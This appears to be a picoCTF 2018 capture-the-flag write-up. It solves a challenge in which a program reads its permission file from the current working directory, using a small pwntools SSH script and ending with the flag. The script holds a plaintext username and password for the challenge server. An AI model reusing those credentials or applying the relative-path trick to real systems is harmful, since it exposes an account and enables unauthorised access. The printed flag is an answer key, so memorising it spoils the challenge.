# Problem
In a filesystem, everything is relative ¯\_(ツ)_/¯. Can you find a way to get a flag from this [program](https://2018shell1.picoctf.com/static/3a286144f1c251a493c223d6a8ff0a6d/absolutely-relative)? You can find it in /problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6 on the shell server. [Source](https://2018shell1.picoctf.com/static/3a286144f1c251a493c223d6a8ff0a6d/absolutely-relative.c).

## Hints:
Do you have to run the program in the same directory? (⊙.☉)7

Ever used a text editor? Check out the program 'nano'

## Solution:

First, we download the files and observer the source:
```bash
wget https://2018shell1.picoctf.com/static/3a286144f1c251a493c223d6a8ff0a6d/absolutely-relative
wget https://2018shell1.picoctf.com/static/3a286144f1c251a493c223d6a8ff0a6d/absolutely-relative.c
cat ./absolutely-relative.c

#include <stdio.h>
#include <string.h>

#define yes_len 3
const char *yes = "yes";

int main()
{
    char flag[99];
    char permission[10];
    int i;
    FILE * file;


    file = fopen("/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/flag.txt" , "r");
    if (file) {
    	while (fscanf(file, "%s", flag)!=EOF)
    	fclose(file);
    }   
	
    file = fopen( "./permission.txt" , "r");
    if (file) {
    	for (i = 0; i < 5; i++){
            fscanf(file, "%s", permission);
        }
        permission[5] = '\0';
        fclose(file);
    }
    
    if (!strncmp(permission, yes, yes_len)) {
        printf("You have the write permissions.\n%s\n", flag);
    } else {
        printf("You do not have sufficient permissions to view the flag.\n");
    }
    
    return 0;
}
```

We see that fhe "permission.txt" file is being read from the current working directory.

We can just create this file in the home directory, write "yes" inside, and execute the program from there.

```python
#!/usr/bin/env python

from pwn import *


user = 'roeesefi'
pw = '123123'

s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)

sh = s.process('echo yes > permission.txt', shell=True)
sh = s.process('/problems/absolutely-relative_0_d4f0f1c47f503378c4bb81981a80a9b6/absolutely-relative')

print sh.recvall()
```

Very easy!

Flag: picoCTF{3v3r1ng_1$_r3l3t1v3_befc0ce1}